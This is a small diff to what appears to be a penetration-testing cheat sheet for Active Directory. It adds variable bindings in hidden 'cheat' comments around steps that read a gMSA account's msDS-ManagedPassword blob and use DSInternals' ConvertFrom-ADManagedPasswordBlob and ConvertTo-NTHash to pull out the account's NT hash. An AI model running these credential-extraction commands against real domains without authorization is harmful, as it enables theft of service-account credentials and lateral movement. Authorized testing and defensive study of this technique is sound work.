@@ -45,6 +45,7 @@ Store the returned msDS-ManagedPassword blob for DSInternals decoding.
 $mp = $gmsa.'msDS-ManagedPassword'
 ```
 <!-- cheat
+var gmsa = $gmsa
 -->
 
 ### Step 3: Decode blob and extract NT hash (DSInternals)
@@ -57,6 +58,7 @@ Decode the gMSA managed password blob and convert the current password to an NT 
 (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
 ```
 <!-- cheat
+var mp = $mp
 -->
 
 ### GMSAPasswordReader
